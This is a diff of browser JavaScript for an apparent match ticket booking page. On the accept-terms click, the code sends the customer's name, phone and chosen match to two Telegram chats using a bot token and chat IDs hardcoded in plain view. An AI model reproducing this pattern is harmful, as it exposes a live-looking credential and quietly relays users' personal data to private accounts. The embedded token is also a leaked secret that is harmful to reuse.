@@ -120,23 +120,24 @@ if (popup) {
 }
 
 // ==========================================
-// 🔥 ACCEPT → GO TO SEATS (FINAL FIX + TELEGRAM)
+// 🔥 ACCEPT → GO TO SEATS (BULLETPROOF TELEGRAM FIX)
 // ==========================================
 const acceptBtn = document.getElementById('accept-tnc-btn');
 if (acceptBtn) {
-    acceptBtn.onclick = async () => {
-        closePopup();
-
+    acceptBtn.onclick = () => {
+        
+        // 1. Button ko block karo taki user 2 baar click na kare
+        acceptBtn.innerText = "Please Wait...";
+        acceptBtn.style.pointerEvents = "none";
+        
         if (typeof fbq !== "undefined") {
             fbq('track', 'InitiateCheckout');
         }
 
-        // --- 🚀 TELEGRAM DUAL ALERT START ---
         const name = localStorage.getItem('customerName') || "Unknown";
         const phone = localStorage.getItem('customerPhone') || "Unknown";
         const matchTitle = match ? match.title : "Unknown Match";
 
-        // Aapka naya Token aur dono Chat IDs
         const botToken = "8764436183:AAGzzpyaDS05CEYIZcITgUm7jA3qWDBfZpM"; 
         const chatId1 = "6820660513"; 
         const chatId2 = "8351268578"; 
@@ -150,21 +151,17 @@ if (acceptBtn) {
         const url1 = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId1}&text=${encodeURIComponent(telegramMsg)}&parse_mode=Markdown`;
         const url2 = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId2}&text=${encodeURIComponent(telegramMsg)}&parse_mode=Markdown`;
 
-        try {
-            // Dono accounts par message ek sath bhejega
-            await fetch(url1);
-            await fetch(url2);
-        } catch (err) {
-            console.log("Telegram alert failed, but continuing...");
-        }
-        // --- 🚀 TELEGRAM DUAL ALERT END ---
-
-        // 🔥 IMPORTANT (DATA SAFE PASS TO SEATS)
-        localStorage.setItem('selectedMatch', JSON.stringify(match));
-
-        setTimeout(() => {
+        // 🔥 IMPORTANT FIX: Pehle message send hoga, fir page redirect hoga!
+        Promise.all([
+            fetch(url1).catch(e => console.log("TG Error 1")),
+            fetch(url2).catch(e => console.log("TG Error 2"))
+        ]).finally(() => {
+            closePopup();
+            // Data safe pass to seats
+            localStorage.setItem('selectedMatch', JSON.stringify(match));
+            // Redirect
             window.location.href = "seats.html";
-        }, 200);
+        });
     };
 }
 
